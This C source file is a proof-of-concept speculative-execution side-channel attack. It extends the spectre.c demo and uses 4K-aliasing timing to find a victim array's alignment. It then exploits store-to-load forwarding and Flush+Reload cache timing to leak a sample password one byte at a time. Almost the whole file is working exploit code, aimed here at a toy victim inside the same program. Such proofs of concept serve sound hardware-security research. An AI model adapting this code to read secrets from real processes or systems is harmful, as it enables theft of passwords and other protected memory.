/* Compile with "gcc -O0 -std=gnu99" */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
The attack details:

Suppose that the attacker desires to obtain the value of secret but does not have access to `array1` and is unsure whether `array1` is aligned or not.
By utilizing `array4` and performing a time side-channel attack that exploits the 4k alias latency cost, it becomes possible to identify
the starting point of `array1`. Without this detection, it is not possible to test the speculated load to store forward technique that Herbert proposes.
Once the attacker aligns `array3` with array1, they will be able to carry out the load to store forwarding technique that Herbert proposes.
Finally, the attacker will utilize `array2` for the cache side-channel attack to determine the cache line number that was loaded from the cache.
 This will reveal the byte that contains the secret value, as illustrated in `spectre.c`.

********************************************************************/

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 2048;
uint64_t times[4096];
uint8_t unused1[64];
//array1 the attacker does not have access.
uint8_t array1[2048];
uint8_t unused2[64];
//array2 the attacker has access to and will be used for the cache side-channel.
uint8_t array2[256 * 512];
uint8_t unused3[64];
//array3 the attacker has access to and will be used for 4k-aliasing.
__attribute__((aligned(4096))) uint8_t array3[2048];
uint8_t unused4[64];
//array4 the attacker has access to and will be used to get array1 offset exploiting a time channel.
__attribute__((aligned(4096))) char array4[4096];


char* secret = "The password is rootkea" ;

void victim_function(size_t x){
    /*Note: The attacker does not have access to array1*/
	array1[x] = secret[x];
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int offset) {
  uint8_t* diverted_array3 = array3+offset;
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;

  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

      /* Call the victim! */
      victim_function(malicious_x);
      /*We assume store2load happens here from `array1` store in `victim_function`.
      to `diverted_array3` which is aligned with `array1` and holds the same
      offset*/

      junk = array2[512*diverted_array3[malicious_x]];

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won't get optimized out */
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int GetUserArrayOffset(int score[2], uint8_t value[2])
{
	static int results[4096];
	int tries, i, j, k,junk=0;
	register uint64_t time1, time2;

	for (i = 0; i < 256; i++) {
		results[i] = 0;
	}

	for (tries = 4000; tries > 0; tries--) {
	
		for (i = 0; i < 4096; i++) {
			times[i] = 0;
		}

        //Go through all possible offsests i \in (0...4095)
		for (i = 0; i < 4096; i++) {
			
			time1 = __rdtscp(&junk); /* READ TIMER */
            // 9K yielded good accuracy when experimenting
			for (register int j = 0; j < 9000; ++j) {


				/* Call the victim! */
				victim_function(0);
				
				// Attempt to read from where the victim wrote to `array1`
				junk = array4[i];
			}
			
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			times[i] += time2;
		}

		/* Increment the highest access time offset.*/
		uint64_t max_time = 0;
		for (i = 0; i < 4096; i++) {
			if (times[i] > max_time) {
				j = i;
				max_time = times[i];
			}
		}
		results[j]++;
		
		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;

		for (i = 0; i < 4096; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
	}
	value[0] ^= junk; /* use junk so code above won't get optimized out */
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
	return j;
}
int main(int argc,
  const char * * argv) {
  size_t malicious_x = 0; /* default for malicious_x */
  int i, score[2], len = 23;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  int offset  = GetUserArrayOffset(score, value);
  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
    readMemoryByte(malicious_x++, value, score, offset);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=%c score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }
  return (0);
}
